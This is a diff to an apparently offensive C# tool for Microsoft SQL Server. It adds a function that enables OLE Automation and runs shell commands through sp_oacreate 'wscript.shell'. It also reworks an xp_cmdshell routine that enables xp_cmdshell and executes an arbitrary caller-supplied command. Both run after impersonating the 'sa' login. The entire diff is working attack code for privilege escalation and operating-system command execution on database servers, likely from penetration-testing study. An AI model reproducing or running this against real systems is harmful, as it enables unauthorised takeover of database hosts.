@@ -6,29 +6,45 @@ namespace SQL
 {
     class Program
     {
+        static void ole_cmd(SqlConnection con, string cmd)
+        {
+
+            String enable_ole = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
+            String execCmd = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"echo Test > C:\\Tools\\file.txt\"';";
+
+
+            SqlCommand command = new SqlCommand(enable_ole, con);
+            SqlDataReader reader = command.ExecuteReader();
+            reader.Close();
+
+            command = new SqlCommand(execCmd, con);
+            reader = command.ExecuteReader();
+            reader.Close();
+            
+        }
 
         static void xp_cmdshell(SqlConnection con, string cmd)
         {
-            if (impersonation(con))
+
+            String enable_xpcmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
+            String execCmd = $"EXEC xp_cmdshell '{cmd}'";
+
+
+            SqlCommand command = new SqlCommand(enable_xpcmd, con);
+            SqlDataReader reader = command.ExecuteReader();
+            reader.Close();
+
+            command = new SqlCommand(execCmd, con);
+            reader = command.ExecuteReader();
+            Console.WriteLine("Result of command is: ");
+            while (reader.Read())
             {
-                String enable_xpcmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
-                String execCmd = $"EXEC xp_cmdshell '{cmd}'";
-
-
-                SqlCommand command = new SqlCommand(enable_xpcmd, con);
-                SqlDataReader reader = command.ExecuteReader();
-                reader.Close();
-
-                command = new SqlCommand(execCmd, con);
-                reader = command.ExecuteReader();
-                Console.WriteLine("Result of command is: " );
-                while (reader.Read())
-                {
-                    Console.WriteLine(reader[0]);
-                }
-                
-                reader.Close();
+                Console.WriteLine(reader[0]);
             }
+
+            reader.Close();
+            
+
         }
 
 
@@ -205,7 +221,20 @@ namespace SQL
                         DisplayUsage();
                         return;
                     }
-                    xp_cmdshell(con, args[3]);
+                    if (impersonation(con))
+                    {
+                        Console.WriteLine("Trying to execute command with xp_cmdshell ...");
+                        xp_cmdshell(con, args[3]);
+                        Console.WriteLine("Trying to execute command with OLE ... ");
+                        ole_cmd(con, args[3]);
+                    }
+                    else
+                    {
+                        Console.ForegroundColor = ConsoleColor.Red;
+                        Console.WriteLine("Unfortunately you cant impersonate sa.");
+                        Console.ResetColor();
+                    }
+                    
                     con.Close();
                     break;
 
